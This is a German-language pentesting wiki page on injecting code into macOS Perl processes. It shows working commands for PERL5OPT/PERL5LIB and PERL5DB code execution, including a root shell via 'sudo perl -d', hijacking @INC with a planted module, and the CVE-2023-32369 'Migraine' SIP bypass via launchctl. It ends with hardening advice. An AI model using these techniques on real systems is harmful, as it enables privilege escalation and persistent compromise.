# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Mithilfe der Umgebungsvariable **`PERL5OPT`** ist es möglich, **Perl** beim Start beliebige Befehle ausführen zu lassen (sogar **bevor** die erste Zeile des Zielskripts geparst wird).
Erstelle beispielsweise dieses Skript:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Jetzt die **Umgebungsvariable exportieren** und das **perl**-Skript ausführen:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Eine weitere Option besteht darin, ein Perl-Modul zu erstellen (z. B. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Und dann die Umgebungsvariablen verwenden, damit das Modul automatisch gefunden und geladen wird:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Weitere interessante Umgebungsvariablen

* **`PERL5DB`** – wenn der Interpreter mit dem **`-d`**- (Debugger-)Flag gestartet wird, wird der Inhalt von `PERL5DB` als Perl-Code *innerhalb* des Debugger-Kontexts ausgeführt.
Wenn du sowohl die Umgebung **als auch** die Command-Line-Flags eines privilegierten Perl-Prozesses beeinflussen kannst, kannst du Folgendes tun:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – unter Windows steuert diese Variable, welches Shell-Executable Perl verwendet, wenn eine Shell gestartet werden muss. Sie wird hier nur der Vollständigkeit halber erwähnt, da sie für macOS nicht relevant ist.

Obwohl `PERL5DB` den **`-d`**-Switch erfordert, findet man häufig Wartungs- oder Installer-Skripte, die mit aktivierter Flag als *root* zur ausführlichen Fehlersuche ausgeführt werden, wodurch die Variable zu einem gültigen Escalation-Vektor wird.

## Über Abhängigkeiten (@INC abuse)

Es ist möglich, den Include-Pfad aufzulisten, den Perl durchsuchen wird (**`@INC`**), indem man Folgendes ausführt:
```bash
perl -e 'print join("\n", @INC)'
```
Typische Ausgabe unter macOS 13/14 sieht wie folgt aus:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Einige der zurückgegebenen Ordner existieren überhaupt nicht. **`/Library/Perl/5.30`** existiert jedoch, ist *nicht* durch SIP geschützt und befindet sich *vor* den durch SIP geschützten Ordnern. Wenn du daher als *root* schreiben kannst, kannst du ein bösartiges Modul (z. B. `File/Basename.pm`) ablegen, das von jedem privilegierten Script, das dieses Modul importiert, *bevorzugt* geladen wird.

> [!WARNING]
> Du benötigst weiterhin **root**, um in **`/Library/Perl`** zu schreiben. macOS zeigt außerdem einen **TCC**-Dialog an, der für den Prozess, der den Schreibvorgang ausführt, **Full Disk Access** anfordert.

Wenn ein Script beispielsweise **`use File::Basename;`** importiert, wäre es möglich, `/Library/Perl/5.30/File/Basename.pm` zu erstellen, das vom Angreifer kontrollierten Code enthält.

## SIP-Umgehung über den Migration Assistant (CVE-2023-32369 „Migraine“)

Im Mai 2023 veröffentlichte Microsoft Informationen zu **CVE-2023-32369**, auch **Migraine** genannt, einer post-exploitation technique, die es einem *root*-Angreifer ermöglicht, **System Integrity Protection (SIP)** vollständig zu **umgehen**.
Die verwundbare Komponente ist **`systemmigrationd`**, ein daemon mit dem Entitlement **`com.apple.rootless.install.heritable`**. Jeder von diesem daemon gestartete Child-Prozess erbt das Entitlement und läuft daher **außerhalb** der SIP-Einschränkungen.<sup>[[1]](#references)</sup>

Zu den von den Forschern identifizierten Child-Prozessen gehört der von Apple signierte Interpreter:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Da Perl `PERL5OPT` berücksichtigt (und Bash `BASH_ENV`), reicht es aus, die *Umgebungsvariablen* des Daemons zu vergiften, um in einem Kontext ohne SIP beliebige Codeausführung zu erlangen:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Wenn `migrateLocalKDC` ausgeführt wird, startet `/usr/bin/perl` mit dem schädlichen `PERL5OPT` und führt `/private/tmp/migraine.sh` aus, *bevor SIP wieder aktiviert wird*. Von diesem Skript aus können Sie beispielsweise eine Payload nach **`/System/Library/LaunchDaemons`** kopieren oder das erweiterte Attribut `com.apple.rootless` zuweisen, um eine Datei **nicht löschbar** zu machen.

Apple hat das Problem in macOS **Ventura 13.4**, **Monterey 12.6.6** und **Big Sur 11.7.7** behoben, aber ältere oder nicht gepatchte Systeme bleiben ausnutzbar.<sup>[[1]](#references)</sup>

## Empfehlungen zur Härtung

1. **Gefährliche Variablen löschen** – privilegierte launchdaemons oder cron jobs sollten mit einer unveränderten Umgebung starten (`launchctl unsetenv PERL5OPT`, `env -i` usw.).
2. **Interpreter nicht als root ausführen**, sofern dies nicht unbedingt erforderlich ist. Verwenden Sie kompilierte Binaries oder geben Sie Privilegien frühzeitig ab.
3. **Vendor-Skripte mit `-T` (taint mode) ausführen**, damit Perl `PERL5OPT` und andere unsichere Schalter ignoriert, wenn die Taint-Prüfung aktiviert ist.
4. **macOS aktuell halten** – „Migraine“ ist in aktuellen Releases vollständig gepatcht.

## Referenzen

- [1] [Microsoft Security Blog – Neue macOS-Schwachstelle Migraine könnte den System Integrity Protection umgehen (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Teil 1 – SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
